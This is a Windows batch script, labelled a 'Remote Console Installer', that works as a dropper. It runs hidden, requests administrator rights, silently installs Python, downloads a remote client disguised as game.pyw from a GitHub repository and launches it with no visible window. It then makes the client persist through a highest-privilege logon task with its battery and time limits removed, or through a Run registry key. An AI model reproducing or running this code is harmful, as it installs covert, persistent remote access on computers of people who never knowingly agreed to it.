@echo off
setlocal EnableExtensions

rem Runs hidden. The elevated pass registers the administrator startup task.

if /i "%~1"=="run" goto START
if /i "%~1"=="lite" goto START

set "RA_SELF=%~f0"

powershell -NoProfile -WindowStyle Hidden -Command "try { Start-Process -FilePath $env:RA_SELF -ArgumentList 'run' -Verb RunAs -WindowStyle Hidden -ErrorAction Stop; exit 0 } catch { exit 3 }"

if errorlevel 3 powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath $env:RA_SELF -ArgumentList 'lite' -WindowStyle Hidden"

exit /b 0


:START
title Remote Console Installer
if /i "%~1"=="run" set "RA_ELEVATED=1"

set "SELF=%~f0"
set "INSTALL_DIR=%LOCALAPPDATA%\RemoteAdmin"
set "TARGET=%INSTALL_DIR%\game.pyw"
set "OLD=%INSTALL_DIR%\nice.pyw"
set "LOG=%INSTALL_DIR%\installer.log"
set "RUN_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "RUN_NAME=Remote Console"
set "GH_REPO=downloader-AXP/downloaded"
set "GH_CLIENT=game.pyw"
set "DOWNLOAD=%TEMP%\ra_latest_game.pyw"
set "PY_VERSION=3.12.10"
set "PY_URL=https://www.python.org/ftp/python/%PY_VERSION%/python-%PY_VERSION%-amd64.exe"
set "PY_INSTALLER=%TEMP%\python-%PY_VERSION%-amd64.exe"
set "PY_EXPECTED=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
set "PYTHON="
set "PYTHONW="

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

if /i not "%SELF%"=="%INSTALL_DIR%\installer.bat" (
    copy /Y "%SELF%" "%INSTALL_DIR%\installer.bat" >nul 2>&1
)

call :LOG "Installer started."

call :ENSURE_PYTHON
if not defined PYTHON goto PYTHON_FAILED

call :ENSURE_REQUESTS
if errorlevel 1 goto DEPS_FAILED

call :DOWNLOAD_LATEST
if errorlevel 1 goto DOWNLOAD_ERROR

call :STOP_CLIENT
call :REMOVE_OLD
ping -n 3 127.0.0.1 >nul
call :STOP_CLIENT

if not exist "%TARGET%" goto INSTALL
fc /b "%TARGET%" "%DOWNLOAD%" >nul 2>&1
if errorlevel 1 goto UPDATE

call :LOG "Installed game.pyw is already the latest version. Restarting it."
goto START_FLOW


:INSTALL
call :LOG "Installing game.pyw from GitHub..."
goto COPY_CLIENT


:UPDATE
call :LOG "Updating game.pyw from GitHub..."


:COPY_CLIENT
copy /Y "%DOWNLOAD%" "%TARGET%" >nul
if errorlevel 1 goto COPY_ERROR


:START_FLOW
call :REGISTER_STARTUP
call :START_CLIENT
if exist "%DOWNLOAD%" del /q "%DOWNLOAD%" >nul 2>&1
call :LOG "Finished."
exit /b 0


:PYTHON_FAILED
call :LOG "ERROR: Could not set up Python 3 on this PC."
exit /b 1

:DEPS_FAILED
call :LOG "ERROR: Could not install the requests package."
exit /b 1

:DOWNLOAD_ERROR
call :LOG "ERROR: Could not download game.pyw from GitHub."
exit /b 1

:COPY_ERROR
call :LOG "ERROR: Could not copy game.pyw to %INSTALL_DIR%."
exit /b 1


rem ==================================================
rem HELPERS
rem ==================================================

:LOG
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
>>"%LOG%" echo [%DATE% %TIME%] %~1
exit /b 0


:FIND_PYTHON
set "PYTHON="
set "PYTHONW="
for /f "delims=" %%I in ('python -c "import sys; print(sys.executable)" 2^>nul') do set "PYTHON=%%I"
if not defined PYTHON for /f "delims=" %%I in ('py -3 -c "import sys; print(sys.executable)" 2^>nul') do set "PYTHON=%%I"
if not defined PYTHON exit /b 0
"%PYTHON%" -c "import sys; raise SystemExit(0 if (sys.version_info[0] == 3 and 8 <= sys.version_info[1] <= 13) else 1)" >nul 2>&1
if errorlevel 1 set "PYTHON="
if not defined PYTHON exit /b 0
for %%I in ("%PYTHON%") do set "PYTHONW=%%~dpIpythonw.exe"
if not exist "%PYTHONW%" set "PYTHON="
exit /b 0


:ENSURE_PYTHON
call :FIND_PYTHON
if defined PYTHON exit /b 0
call :LOG "No compatible Python found. Downloading Python %PY_VERSION%..."
if exist "%PY_INSTALLER%" del /q "%PY_INSTALLER%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri $env:PY_URL -OutFile $env:PY_INSTALLER"
if errorlevel 1 exit /b 0
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s = Get-AuthenticodeSignature -LiteralPath $env:PY_INSTALLER; if ($s.Status -ne 'Valid' -or $s.SignerCertificate.Subject -notlike '*Python Software Foundation*') { exit 1 }"
if errorlevel 1 (
    del /q "%PY_INSTALLER%" >nul 2>&1
    exit /b 0
)
call :LOG "Installing Python %PY_VERSION%..."
"%PY_INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_launcher=0 InstallLauncherAllUsers=0 Include_test=0 Include_doc=0 Include_tcltk=0 Shortcuts=0
del /q "%PY_INSTALLER%" >nul 2>&1
set "PYTHON=%PY_EXPECTED%"
if not exist "%PYTHON%" for /f "delims=" %%I in ('dir /b /s "%LOCALAPPDATA%\Programs\Python\python.exe" 2^>nul') do set "PYTHON=%%I"
if not exist "%PYTHON%" exit /b 0
for %%I in ("%PYTHON%") do set "PYTHONW=%%~dpIpythonw.exe"
if not exist "%PYTHONW%" set "PYTHON="
exit /b 0


:ENSURE_REQUESTS
"%PYTHON%" -c "import requests; requests.post" >nul 2>&1
if not errorlevel 1 exit /b 0
call :LOG "Installing the requests package..."
"%PYTHON%" -m pip install --user --disable-pip-version-check --no-warn-script-location requests >>"%LOG%" 2>&1
if errorlevel 1 exit /b 1
"%PYTHON%" -c "import requests; requests.post" >nul 2>&1
if errorlevel 1 exit /b 1
exit /b 0


:STOP_CLIENT
call :LOG "Stopping the running client..."
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Process | Where-Object { ($_.Name -eq 'pythonw.exe' -or $_.Name -eq 'python.exe') -and ($_.CommandLine -like '*nice.pyw*' -or $_.CommandLine -like '*game.pyw*') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1
exit /b 0


:REMOVE_OLD
if exist "%OLD%" del /q "%OLD%" >nul 2>&1
exit /b 0


:DOWNLOAD_LATEST
call :LOG "Downloading game.pyw..."
if exist "%DOWNLOAD%" del /q "%DOWNLOAD%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; $ProgressPreference='SilentlyContinue'; $u = 'https://raw.githubusercontent.com/' + $env:GH_REPO + '/main/' + $env:GH_CLIENT + '?t=' + [guid]::NewGuid().ToString('N'); Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile $env:DOWNLOAD -TimeoutSec 120"
if errorlevel 1 exit /b 1
if not exist "%DOWNLOAD%" exit /b 1
for %%I in ("%DOWNLOAD%") do if %%~zI LEQ 0 exit /b 1
exit /b 0


:REGISTER_STARTUP
if defined RA_ELEVATED (
    call :REGISTER_STARTUP_TASK
    if not errorlevel 1 (
        reg delete "%RUN_KEY%" /v "%RUN_NAME%" /f >nul 2>&1
        exit /b 0
    )
)
reg add "%RUN_KEY%" /v "%RUN_NAME%" /t REG_SZ /d "\"%PYTHONW%\" \"%TARGET%\"" /f >nul
if errorlevel 1 call :LOG "WARNING: Could not register the startup entry."
exit /b 0


:REGISTER_STARTUP_TASK
schtasks /Create /TN "%RUN_NAME%" /TR "\"%PYTHONW%\" \"%TARGET%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
if errorlevel 1 (
    call :LOG "WARNING: Could not register the elevated startup task."
    exit /b 1
)
powershell -NoProfile -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; try { $n=$env:RUN_NAME; $s=(Get-ScheduledTask -TaskName $n).Settings; $s.DisallowStartIfOnBatteries=$false; $s.StopIfGoingOnBatteries=$false; $s.ExecutionTimeLimit='PT0S'; $s.StartWhenAvailable=$true; Set-ScheduledTask -TaskName $n -Settings $s | Out-Null } catch { exit 1 }" >nul 2>&1
if errorlevel 1 call :LOG "WARNING: Could not update the startup task conditions."
exit /b 0


:START_CLIENT
start "" "%PYTHONW%" "%TARGET%"
exit /b 0
